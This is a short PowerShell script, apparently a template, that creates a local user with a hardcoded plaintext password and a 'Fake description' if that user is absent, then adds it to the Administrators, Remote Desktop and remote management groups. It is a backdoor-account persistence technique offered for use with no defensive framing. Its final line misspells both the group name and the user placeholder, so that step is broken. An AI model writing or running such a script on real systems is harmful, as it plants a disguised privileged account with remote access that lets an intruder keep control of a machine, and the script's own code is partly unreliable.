$e = (Out-String -InputObject (net user 'YOUR_USER' 2>&1))

if ($e -like '*could not be found*')
{
    new-localuser -Name "YOUR_USER" -Password (convertto-securestring -string 'P4SSW3RD' -force -asplaintext) -Description "Fake description"
    Add-LocalGroupMember -Group "Administrators" -Member "YOUR_USER"
    Add-LocalGroupMember -Group "Remote Desktop" -Member "YOUR_USER"
    Add-LocalGroupMember -Group "Remote Desktop Users" -Member "YOUR_USER"
    Add-LocalGroupMember -Group "Remote Management Use" -Member "YOUR_USR"
}
